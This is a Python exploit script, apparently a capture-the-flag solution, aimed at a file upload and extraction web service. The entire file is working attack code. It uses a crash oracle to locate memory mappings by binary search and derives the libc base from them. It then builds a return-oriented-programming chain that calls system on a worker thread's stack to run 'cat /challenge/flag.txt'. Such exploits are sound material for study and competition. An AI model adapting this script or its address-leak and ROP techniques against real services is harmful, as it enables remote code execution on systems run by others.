import requests
from pwn import *
import time
r = remote("pwn.chall.pwnoh.io", "13370")
r.recvuntil("[*] ip =")
ip = r.recvline().decode().strip()
msg = r.recvuntil("[*] port =")
port = int(r.recvline())

# I have this prompt here because you may wish to use localhost instead of remote
#ip = input("IP? ").strip()
URL_BASE = f"http://{ip}:{port}/"



def upload(num, data):
    r = requests.post(URL_BASE + f"/upload/{num}", files={"file": data})

def mmap(num, extract=False):
    with requests.get(URL_BASE + f"/files/{num}" + ("?extract=true" if extract else ""), stream=True) as r:
        for chunk in r.iter_content(chunk_size=4096):
            #print("Got chunk: %s" % (str(chunk)))
            # we don't actually care about the body
            break

def crash_oracle(num):
    r = requests.get(URL_BASE + f"/files/{num}?extract=true")
    #print(r.content)
    return (len(r.content) != 9 or r.content[8] != 0xAA)

guess_id = 200000
def guess(addr):
    global guess_id
    guess_off = 0x13371337000 - addr;
    upload(guess_id, b"\xef\xcd\xab\x89\x67\x45\x23\x01" + p64(9) + p8(3) + p64(guess_off, sign="signed") + p64(8) + p8(1) + b"\xAA")

    # Check
    addr = hex(addr)
    result = False
    if crash_oracle(guess_id):
        pass
        print(f"Crashed: {addr}")
    else:
        print(f"Didn't crash: {addr}")
        result = True
    guess_id += 1
    return result

# Simple exmaple
#upload(1, b"\xef\xcd\xab\x89\x67\x45\x23\x01" + p64(8) + (p8(1) + b"F") * 4)

#upload(3, b"Q" * 2 * (10 ** 9))

# Create a few large files and map them in
TOTAL_SIZE = 1 * (10 ** 9)
CHUNK_SIZE = TOTAL_SIZE #0x1000 * 256

chunk_num = 10
for x in range(0, TOTAL_SIZE, CHUNK_SIZE):
    upload(chunk_num, b"\xef\xcd\xab\x89\x67\x45\x23\x01" + p64(CHUNK_SIZE))
    mmap(chunk_num, extract=True)
    chunk_num += 1

known = None

for x in range(0x7f0000000000, 0x7fffffffffff, TOTAL_SIZE):
    if guess(x & ~0xfff):
        known = x & ~0xfff
        break

# Now we have ONE address, lets find the beginning of the segment
max_guess = known
min_guess = ((known - TOTAL_SIZE) & ~0xfff) - 0x1000

while min_guess + 0x1000 != max_guess:
    cur_guess = ((min_guess + max_guess) // 2) & ~0xfff
    if guess(cur_guess):
        max_guess = cur_guess
    else:
        min_guess = cur_guess

    print("min: %s  max: %s" % (hex(min_guess), hex(max_guess)))

print("Done with binary search: %s" % (hex(max_guess)))

# Now the libraries should be at a (roughly) constant offset from our large mmap'd file
somewhere_in_libs = max_guess + 0x5e00000 + (CHUNK_SIZE & ~0xfff)

print("libs guess: %s" % (hex(somewhere_in_libs)))

# Binary search to find the END of the libraries

min_guess = somewhere_in_libs
max_guess = somewhere_in_libs + 0x10000000


while min_guess + 0x1000 != max_guess:
    cur_guess = ((min_guess + max_guess) // 2) & ~0xfff
    if guess(cur_guess):
        min_guess = cur_guess
    else:
        max_guess = cur_guess

    print("min: %s  max: %s" % (hex(min_guess), hex(max_guess)))


print("Done with binary search 2: %s" % (hex(max_guess)))

# libc base is literally at a constant offset from the end of the libs
libc_base = max_guess - 0x47F000

print("LIBC BASE: %s" % (hex(libc_base)))

_ = input("press enter to continue...")

free_hook_addr = libc_base + 0x1E3E20
system_addr = libc_base + 0x4FA60
environ_addr = libc_base + 0x1E45A0

# I originally thought I wanted a steak leak, but nope
"""

# We know where libc is so we can leak environ
# This will give us a stack leak.

guess_off = 0x13371337000 - environ_addr;
upload(guess_id, b"\xef\xcd\xab\x89\x67\x45\x23\x01" + p64(9) + p8(3) + p64(guess_off, sign="signed") + p64(8) + p8(1) + b"\xAA")

rq = requests.get(URL_BASE + f"/files/{guess_id}?extract=true")
stack_leak = u64(rq.content[:8])
print(hex(stack_leak))
guess_id += 1

_ = input("press enter to continue...")

"""

# So, it turns out that oatp will spawn multiple threads to handle requests. These other threads get stacks in mmap segments that will be at constant offset from the end of libs
# Since we know where the stack of these other threads is, we can do ROP

ret_addr = max_guess - 0x5B7158
ret_addr -= 0x21000 # for container


ropchain = b""
ropchain += p64(libc_base + 0x0000000000028a55) # pop rdi; ret
ropchain += p64(ret_addr + 0x20)
ropchain += p64(libc_base + 0x0000000000028a56) # ret (alignment)
ropchain += p64(system_addr)
ropchain += b"cat /challenge/flag.txt\0" # this is at ret_addr + 0x18

exploit = b"\xef\xcd\xab\x89\x67\x45\x23\x01" + p64(len(ropchain)) + p8(2) + p64(ret_addr - 0x13371337000)
for b in ropchain:
    exploit += b"\x01" + p8(b)

for x in range(50):
    upload(guess_id, exploit)
    crash_oracle(guess_id)
    guess_id += 1

r.interactive()

